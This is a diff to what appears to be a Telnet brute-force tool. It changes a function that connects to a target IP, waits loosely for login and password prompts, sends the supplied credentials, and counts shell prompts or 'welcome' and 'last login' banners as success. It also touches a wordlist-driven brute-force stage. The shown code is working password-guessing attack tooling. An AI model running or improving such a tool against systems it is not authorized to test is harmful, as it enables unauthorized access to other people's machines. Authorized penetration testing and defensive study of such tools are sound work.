@@ -16,27 +16,27 @@ async def test_telnet(target_ip, port, username, password):
     """
     try:
         reader, writer = await telnetlib3.open_connection(
-            host=target_ip, port=int(port), connect_minwait=0.05, connect_maxwait=2.5
+            host=target_ip, port=int(port), connect_minwait=0.1, connect_maxwait=3
         )
 
         # Look for a login (e.g.: "login:")
-        await asyncio.wait_for(reader.readuntil("login: "), timeout=1)
-        writer.write(username + "\n")
-
+        data = await asyncio.wait_for(reader.read(100), timeout=2)
+        if "login" in data.lower() or "username" in data.lower():
+            writer.write(username + "\n")
+            
         # Look for a password prompt (e.g.: "Password:")
-        await asyncio.wait_for(reader.readuntil("Password: "), timeout=1)
-        writer.write(password + "\n")
+        data = await asyncio.wait_for(reader.read(100), timeout=2)
+        if "password" in data.lower():
+            writer.write(password + "\n")
 
-        # Read the response looking for a shell prompt ($ or #)
-        try:
-            result = await asyncio.wait_for(reader.readuntil("$"), timeout=1.5)
-        except asyncio.TimeoutError:
-            result = await asyncio.wait_for(reader.readuntil("#"), timeout=1.5)
+        await asyncio.sleep(0.5)
+        result = await asyncio.wait_for(reader.read(200), timeout=2)
 
         writer.close()
-
-        # Verification
-        return "$" in result or "#" in result
+        await writer.wait_closed()
+        
+        success_indicators = ["$", "#", "welcome", "last login"]
+        return any(ind in result.lower() for ind in success_indicators)
 
     except KeyboardInterrupt:
         return False
@@ -77,7 +77,7 @@ async def _execute_async(options):
         # Stage 2: Brute Force Wordlist
         # ---------------------------------------------
         if wordlist_path and os.path.exists(wordlist_path):
-            print(f"\n{C.MENU}  [*] Starting stage 2: Brute Force {wordlist_path}")
+            print(f"\n{C.MENU}  [*] Starting stage 2: Brute Force")
 
             try:
                 with open(wordlist_path, "r", encoding="latin-1") as f:
